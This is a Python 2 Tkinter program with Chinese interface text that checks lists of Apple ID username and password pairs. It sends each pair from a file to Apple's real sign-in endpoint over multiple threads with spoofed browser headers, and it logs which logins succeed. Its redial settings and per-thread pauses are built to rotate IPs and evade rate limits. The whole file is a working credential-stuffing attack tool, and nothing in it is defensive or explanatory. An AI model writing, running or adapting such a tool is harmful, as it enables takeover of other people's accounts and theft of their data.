# coding: gbk
import Tkinter as tk
import tkMessageBox
import tkFont
import re
import requests
import threading
import Queue
import json
import time
from tkFileDialog import askopenfile


class FileHandle:
    def __init__(self):
        self.root = tk.Tk()
        self.read_file = ''
        self.letter_pos = ''
        self.root.title(u'拨号-尝试登陆AppleID')
        ft = tkFont.Font(family='Fixdsys', size=15, weight=tkFont.BOLD)
        tk.Label(self.root, text=u'准备工作', font=ft).grid(row=0, sticky=tk.W)
        new_frame = tk.Frame(self.root)
        new_frame.grid(row=2, column=0, sticky=tk.W)
        tk.Label(new_frame, text=u'请选择 AppleID文件 :').grid(row=0, column=0)
        tk.Button(new_frame, text=u'浏览', command=self.browser_file).grid(row=0, column=3, columnspan=3)
        self.file_chose = tk.Label(self.root, text=u'已选择文件: 尚未选择文件')
        self.file_chose.grid(row=3, sticky=tk.W)
        tk.Label(self.root, text='-' * 110).grid(row=4, column=0, sticky=tk.W)

        # 拨号
        new_frame2 = tk.Frame(self.root)
        new_frame2.grid(row=5, column=0, sticky=tk.W)
        self.ip_set = tk.Label(new_frame2, text=u'拨号设置:无IP', font=ft)
        self.ip_set.grid(row=0, column=0, columnspan=8, sticky=tk.W)
        self.username = tk.StringVar()
        self.passwd = tk.StringVar()
        self.num1 = tk.StringVar()
        self.passue = tk.StringVar()
        self.num2 = tk.StringVar()
        self.wait_dial = tk.StringVar()

        tk.Label(new_frame2, text=u'账号: ').grid(row=1, column=0, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.username).grid(row=1, column=1, sticky=tk.W)
        tk.Label(new_frame2, text=u'  每操作(个): ').grid(row=1, column=3, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.num1, width=3).grid(row=1, column=4, sticky=tk.W)
        self.num1.set(10)
        tk.Label(new_frame2, text=u'   每条线程暂停登陆(秒): ').grid(row=1, column=5, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.passue, width=4).grid(row=1, column=6, sticky=tk.W)
        self.passue.set(3)

        tk.Label(new_frame2, text=u'密码: ').grid(row=2, column=0, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.passwd).grid(row=2, column=1, sticky=tk.W)
        tk.Label(new_frame2, text=u'  每操作(个): ').grid(row=2, column=3, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.num2, width=3).grid(row=2, column=4, sticky=tk.W)
        self.num2.set(50)
        tk.Label(new_frame2, text=u'  断开并重新拨号等待(秒): ').grid(row=2, column=5, sticky=tk.W)
        tk.Entry(new_frame2, textvariable=self.wait_dial, width=4).grid(row=2, column=6, sticky=tk.W)
        self.wait_dial.set(5)
        tk.Button(new_frame2, text=u'拨号', font=ft, command=self.dial_call).grid(row=1, column=7, rowspan=2, columnspan=2, sticky=tk.W)

        # # 分隔符相关
        self.threading_num = tk.StringVar()
        self.delimiter = tk.StringVar()

        tk.Label(self.root, text='-' * 110).grid(row=7, sticky=tk.W)
        tk.Label(self.root, text=u'处理规则', font=ft).grid(column=0, columnspan=3, sticky=tk.W)

        new_frame3 = tk.Frame(self.root)
        new_frame3.grid(row=9, sticky=tk.W)

        tk.Label(new_frame3, text=u'文件分隔符:').grid(row=2, column=0, sticky=tk.W)
        tk.Entry(
            new_frame3, textvariable=self.delimiter,
            width=10
        ).grid(row=2, column=1, sticky=tk.W)
        tk.Label(new_frame3, text=u'   设置线程数:  ').grid(row=2, column=2, sticky=tk.W)
        tk.Entry(new_frame3,  textvariable=self.threading_num, width=3).grid(row=2, column=4, sticky=tk.W)
        self.threading_num.set(5)
        tk.Label(new_frame3, text=u'  ').grid(row=2, column=5, sticky=tk.W)
        tk.Button(new_frame3, text=u'执行', command=self.run, font=ft).grid(row=2, column=6, sticky=tk.E)

        tk.Label(self.root, text='-' * 110).grid(row=10, sticky=tk.W)
        self.tb = tk.Text(self.root)
        self.tb.grid(row=11, sticky=tk.W)

        new_frame4 = tk.Frame(self.root)
        new_frame4.grid(row=12, sticky=tk.W)
        self.line_num = tk.Label(new_frame4, text=u'文件总数: 0 |  ')
        self.line_num.grid(row=0, column=0, sticky=tk.W)

        self.write_num = tk.Label(new_frame4, text=u'已写入: 0  | ')
        self.write_num.grid(row=0, column=1, sticky=tk.W)
        self.right_file = tk.Label(new_frame4, text=u'可登录报错:   | ')
        self.right_file.grid(row=0, column=2, sticky=tk.W)
        self.wrong_file = tk.Label(new_frame4, text=u'错误结果保存:    ')
        self.wrong_file.grid(row=0, column=3, sticky=tk.W)

    def dial_call(self):
        self.ip_set['text'] = u'拨号设置:有啦, 你这傻逼'

    def form_check(self):
        if not self.read_file:
            tkMessageBox.showerror(message=u'请选择文件')
            return 0
        elif not self.username.get():
            tkMessageBox.showerror(message=u'账号不能为空')
            return 0
        elif not self.passwd.get():
            tkMessageBox.showerror(message=u'密码不能为空')
            return 0
        elif not self.delimiter.get():
            tkMessageBox.showerror(message=u'分割符为空')
            return 0
        else:
            rtc = 1
        return rtc

    def browser_file(self):
        self.read_file = askopenfile()
        if self.read_file:
            self.file_chose['text'] = u'已选择文件: %s' % self.read_file.name
            return self.read_file.name

    def run(self):
        rtc = self.form_check()
        if rtc:
            runtime = time.clock()
            print 128, int(self.threading_num.get())
            s = IcloudScan(self.read_file, thread_num=int(self.threading_num.get()))
            result = [
                self.tb, self.line_num, self.write_num,
                self.right_file, self.wrong_file, self.delimiter
                      ]
            s.main(result)
            tkMessageBox.showinfo(message=u'处理完成, 耗时: %s' % (time.clock() - runtime) )
        else:
            print 'cuo'

    def main(self):
        self.root.mainloop()


class IcloudScan:
    """
    According the Txt to check avaliabled
    """
    def __init__(self, file_fd, thread_num=5):
        self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
        self.file = file_fd
        self.line_num = 0
        self.right = open('%s result-right.txt' % self.file.name, 'w')
        self.wrong = open('%s result-error.txt' % self.file.name, 'w')
        self.thread_num = thread_num
        self.read_queue = Queue.Queue()
        self.write_queue = Queue.Queue()
        self.html = requests.session()
        self.html.headers.update({
            'Host': 'idmsa.apple.com',
            'Connection': 'keep-alive',
            'Content-Length': '101',
            'X-Apple-Widget-Key': '83545bf919730e51dbfba24e7e8a78d2',
            'Origin': 'https://idmsa.apple.com',
            'X-Apple-I-FD-Client-Info': '{"U":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36","L":"zh-CN","Z":"GMT+08:00","V":"1.1","F":"N0a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVglE4Ww.GEFF0Yz3ccbbJYMLgiPFU77qZoOSix5ezdstlYysrhsui65AQnKA15nW0vLG9mhORoVidPZW2AUMnGWVQdgMVQdg1kzoMpwoNJ9z4oYYLzZ1kzDlSgyyIT1n3wL6k03x0.5EwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesRNhjCJg7QD36hO3f9p_nH1uzjkD6myjaY2hDpBtOtJJIqSI6KUMnGWpwoNSUC56MnGW87gq1HACVcOJVB38cTjQhUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4WugMJeqDxp.jV2pNk0ug97.Dv64KxN4t1VKWZWu_JzK9zHkcCmx_B4W1kl1BQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUu_LzQW5BNv_BBNlYCa1nkBMfs.9g."}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://idmsa.apple.com/appleauth/auth/signin?widgetKey=83545bf919730e51dbfba24e7e8a78d2&locale=zh_CN&font=sf',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.8',
        })

    def read_file(self, tk_line_total):
        for line in self.file:
            self.line_num += 1
            self.read_queue.put(line)

        tk_line_total['text'] = u'文件总数: %s  ' % self.line_num
        # print 'Read file completed'
        # print 'Totol line num is : %s' % self.line_num

    def run(self, delimiter):
        num = 0
        flag = 1
        while 1:
            if not self.read_queue.empty():
                line = self.read_queue.get(timeout=60)
                if line:
                    line = line.strip()
                    if delimiter in line:
                        username, passwd = line.split(delimiter)
                    else:
                        username, passwd = line.split()[:2]
                num += 1
                # print "%s handle the %s record" % (thread_name, num)
                requests_data = json.dumps({
                    'accountName': username,
                    'password': passwd,
                    'rememberMe': 'false',
                    'trustTokens': []
                })
                while flag < 4:
                    try:
                        result = json.loads(
                            self.html.post(
                                self.url,
                                data=requests_data,
                                verify=True
                            ).text
                        )
                        flag = 4
                    except requests.exceptions.ConnectionError:
                        print '[Error]: The %s time to try again!' % flag

                    message = u'账号: %-25s 密码: %-15s ' % (username, passwd)
                    if 'serviceErrors' in result:
                        tmp_result = result['serviceErrors'][0]
                        self.write_queue.put((
                            self.wrong,
                            message + u'不正确 错误代码: %s 错误信息: %s \n' % (
                                tmp_result['code'],
                                tmp_result['message']
                            )))
                    elif not result:
                        self.write_queue.put((
                            self.right,
                            message + u'正确\n'
                        ))

                flag = 1
            else:
                # print "Record MQ is empty! threading: %s exit" % thread_name
                break

    def write_log(self, tb, write_num, right_num, wrong_num):
        line = 0
        r_n = w_n = 0
        while 1:
            try:
                fd, message = self.write_queue.get(timeout=60)
                if fd is self.wrong:
                    w_n += 1
                elif fd is self.right:
                    r_n += 1

                line += 1
                print message
                tb.insert(tk.END, message)
                time.sleep(0.1)
                tb.update()
                tb.see(tk.END)
                # write_num['text'] = u'已写入: %s    ' % line
                # right_num['text'] = u'已写入: %s    ' % r_n
                # wrong_num['text'] = u'已写入: %s    ' % w_n
                fd.write(message.encode('utf8'))

            except Queue.Empty:
                # print "Writing MQ is empty!, threading exit"
                break
        # print "Totle of record writed is %s !" % line

    def main(self, para_set):
        tb, total_line, write_num, right_num, wroong_num, delimiter = para_set

        thread_list = []
        thread_list.append(
            threading.Thread(target=self.read_file, args=(total_line,))
        )
        thread_list.append(
            threading.Thread(target=self.write_log, args=(tb, write_num, right_num, wroong_num))
        )
        for tn in range(self.thread_num):
            thread_list.append(
                threading.Thread(target=self.run, args=(delimiter.get(),))
            )

        # run all
        for mission in thread_list:
            mission.start()
        # recycle all
        for mission in thread_list:
            mission.join()

if __name__ == '__main__':
    f = FileHandle()
    f.main()